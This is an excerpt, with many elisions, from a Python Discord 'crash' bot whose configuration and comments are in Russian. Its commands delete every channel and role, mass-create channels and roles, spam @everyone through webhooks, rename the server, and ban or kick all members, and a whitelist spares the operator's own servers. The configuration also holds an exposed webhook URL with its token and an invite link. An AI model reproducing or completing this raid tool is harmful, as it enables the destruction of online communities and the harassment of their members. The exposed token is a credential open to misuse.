...
prefix = 'h!' # наш префикс

# подробные настройки
channelsn = 'crash-by-fskteam' #имя каналов при краше
rolesn = 'Crash By FSKHaker'#имя ролей при краше
namen = 'Crashed By FSKHaker'#имя сервера при краше
iconn = 'icon.PNG' # не трогайте лучше
hooknamen = 'Crashed By FSKHaker'#имя хуков
botnamen = 'FSK Haker'#тип имя бота
inviten = 'https://discord.gg/ypA6Xj88Hz' # тут ссылка на ваш сервер
spamtextn = f'@everyone\nДанный сервер крашиться ботом FSKHaker\nСервер поддержки: {inviten}'
admins = [1090467788562387056] # тут укажи id админов (могут добавлять сервера в вайт лист и менять статус боту), например [123,456,777]
reasonn = 'Crash by FSKCrash' # причина удаления ролей,каналов, бана и кика участников
loghook = 'https://discordapp.com/api/webhooks/1116779599695724544/NiG3jde0Ge3XEB7aMYN8YsHh_OOW-i737_ZhjU5fUF7MEissU1nxwOveCqVq_UTD1Hce'# ссылка на вебхук с логами
...
async def addwl(ctx,idd=None):
    if idd == None:
        await ctx.send(embed=discord.Embed(title='Ошибка',description='Укажите ID сервера!',colour=discord.Colour.from_rgb(0,141,0)))
        ...
        with open('wl.json','w') as f:
            json.dump(bd,f)
        await ctx.send(embed=discord.Embed(title='Успешно',description=f'Теперь данный сервер НЕЛЬЗЯ крашнуть! :smiling_imp:',colour=discord.Colour.from_rgb(0,141,0)))
    else:
        await ctx.send(embed=discord.Embed(title='У вас Недостаточно прав',colour=discord.Colour.from_rgb(0,141,0)))
  ...
  if int(guild.id) in wls["wl"]:
    ...
    async with aiohttp.ClientSession() as session: # с помощью aiohttp отправляем лог на вебхук
        ...
        embed = discord.Embed(
            ...
            colour = discord.Colour.from_rgb(0,141,0)
        )
...
async def delchannels(ctx):
    ...
    await ctx.author.send(embed=discord.Embed(title='Каналы успешно удалены',description=f'Было удалено {count} каналов',colour=discord.Colour.from_rgb(0,141,0)))
...
async def delroles(ctx):
    ...
    await ctx.author.send(embed=discord.Embed(title='Роли успешно удалены',description=f'Было удалено {count} ролей',colour=discord.Colour.from_rgb(0,141,0)))
...
async def createchannels(ctx, count):
    ...
    await ctx.author.send(embed=discord.Embed(title=f'Было создано {good} каналов',colour=discord.Colour.from_rgb(0,141,0)))
...
async def createroles(ctx, count):
    ...
    await ctx.author.send(embed=discord.Embed(title=f'Было создано {good} ролей',colour=discord.Colour.from_rgb(0,141,0)))
...
async def spamwebhooks(ctx):
    async with aiohttp.ClientSession() as session: # тоже самое что и сверху с входом на сервер
        ...
        await webhook.send(embed=embed)
    await ctx.author.send(embed=discord.Embed(title='Создание вебхуков запущено',description='Если на сервере более 50 текстовых каналов или бот не сможет создать вебхук - просто ничего не произойдёт',colour=discord.Colour.from_rgb(0,141,0)))
...
async def spamwebhook1(ctx):
    try:
        ...
        await ctx.author.send(embed=discord.Embed(title='Спам вебхуками на текущий канал запущен', colour=discord.Colour.from_rgb(0,141,0)))
...
async def rename(ctx):
    ...
    try:
        ...
        await ctx.author.send(embed=discord.Embed(title='Ошибка!',description=f'Что-то пошло не так, и я не смог поменять имя и аватарку этому серверу',colour=discord.Colour.from_rgb(0,141,0)))
...
async def banall(ctx):
    ...
    await ctx.author.send(embed=discord.Embed(title=f'Забанено {count} человек',colour=discord.Colour.from_rgb(0,141,0)))
    ...
    for jktimosha in ctx.guild.members:
        if int(jktimosha.id) != int(ctx.message.author.id):
            try:
                ...
                count+=1
    await ctx.author.send(embed=discord.Embed(title=f'Кикнуто {count} человек',colour=discord.Colour.from_rgb(0,141,0)))
